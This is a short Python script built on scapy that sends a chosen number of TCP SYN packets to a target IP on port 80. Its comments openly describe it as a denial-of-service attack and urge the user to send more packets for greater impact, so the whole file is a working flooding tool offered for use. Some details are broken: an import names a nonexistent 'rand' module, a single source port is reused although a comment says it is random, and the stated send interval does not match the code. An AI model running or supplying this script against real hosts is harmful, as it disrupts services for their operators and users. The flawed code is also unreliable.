import rand as rand
from scapy.all import *
import random as rand
dest=str(sys.argv[1])#the users input the ip destination as the first argument after the filename when running the attack
nbofpkts=str(sys.argv[2])#the users input the desired number of fragments they'd like to send as the second argument after the destination ip
sport=rand.randint(1024,65535)
while int(nbofpkts)<35: #while loop to recommend for the user to send a more significant number of packets to launch a dos attack
    ans=input("It is recommended to increase the number of packets sent to have more impact, Would you like to increase the number? (type y for yes and n for no) ")
    if ans=="y":
        nbofpkts=input("Enter the new number ")
    else:
        break

for i in range(int(nbofpkts)): #send a number of packets the user specifies
    #packet with an IP layer, TCP layer with syn flag set to 1, a time interval of 0.0001 secs between every sent packet, random source port and a destination port of 80 (HTTP)
    send(IP(dst=dest) / TCP(sport=sport, dport=80, flags='S'), inter=0.001) #source is scapy's tutorial on how to create packets with different layers https://weril.me/wp-content/uploads/2019/01/ScapyCheatSheet_v0.2.pdf
